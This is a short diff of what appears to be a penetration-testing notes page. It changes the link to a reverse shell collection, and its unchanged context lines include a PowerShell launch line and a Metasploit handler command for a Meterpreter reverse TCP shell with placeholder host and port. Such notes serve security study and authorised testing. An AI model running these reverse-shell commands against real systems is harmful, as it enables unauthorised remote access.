@@ -23,7 +23,7 @@ Start-Process "shell-name.exe"
 use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
 
 ```
-### [Reverse Shell Collection](https://github.com/dayaramb/dayaramb.github.io/tree/master/reverse_shells)
+### [Reverse Shell Collection](https://github.com/dayaramb/pentest-tools/tree/master/reverse_shells)
 
 
 ### Random Exploit collection
